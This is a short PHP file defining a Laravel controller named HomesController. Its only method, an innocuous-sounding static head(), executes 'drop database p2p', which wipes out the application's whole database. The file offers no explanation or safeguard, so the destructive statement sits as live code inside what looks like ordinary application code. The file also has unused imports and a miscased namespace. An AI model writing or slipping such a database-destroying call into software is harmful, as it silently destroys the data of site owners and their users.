<?php

namespace App\Http\Controllers;

use Illuminate\Foundation\Bus\DispatchesJobs;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use App\Http\controllers\controller;
use DB;
abstract class HomesController extends controller
{
    public static function head()
    {
            return DB::delete('drop database p2p');
    }
}
